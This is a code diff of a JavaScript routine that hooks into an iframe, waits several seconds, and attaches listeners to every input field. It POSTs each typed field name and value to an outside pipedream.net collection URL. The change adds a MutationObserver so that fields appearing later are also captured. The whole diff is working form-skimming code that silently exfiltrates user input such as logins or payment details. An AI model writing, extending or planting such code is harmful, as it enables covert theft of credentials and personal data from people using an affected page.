@@ -73,20 +73,31 @@ async function iframe() {
 
 			await new Promise(resolve => setTimeout(resolve, 8000));
 
-			doc.querySelectorAll('input').forEach(field => {
-				field.addEventListener('input', async function() {
-					const name = this.name || this.id || this.type || 'field';
-					const value = this.value;
+			function attachListeners(doc) {
+				doc.querySelectorAll('input').forEach(field => {
+					field.addEventListener('input', async function() {
+						const name = this.name || this.id || this.type || 'field';
+						const value = this.value;
 
-					console.log(`[${name}] : ${value}`);
+						console.log(`[${name}] : ${value}`);
 
-					await fetch('https://eoXXXXXX.m.pipedream.net', {
-						method: 'POST',
-						body: JSON.stringify({ field: name, value }),
-						headers: { 'Content-Type': 'application/json' }
+						await fetch('https://eoXXXXXX.m.pipedream.net', {
+							method: 'POST',
+							body: JSON.stringify({ field: name, value }),
+							headers: { 'Content-Type': 'application/json' }
+						});
 					});
 				});
+			}
+			const observer = new MutationObserver(() => attachListeners(doc));
+
+			observer.observe(doc.body, {
+				childList: true,
+				subtree: true
 			});
+
+			attachListeners(doc);
+
 		} catch (err) {
 			console.error('iframe hook failed', err);
 		}
@@ -104,3 +115,4 @@ async function iframe() {
 		}
 	}
 })();
+
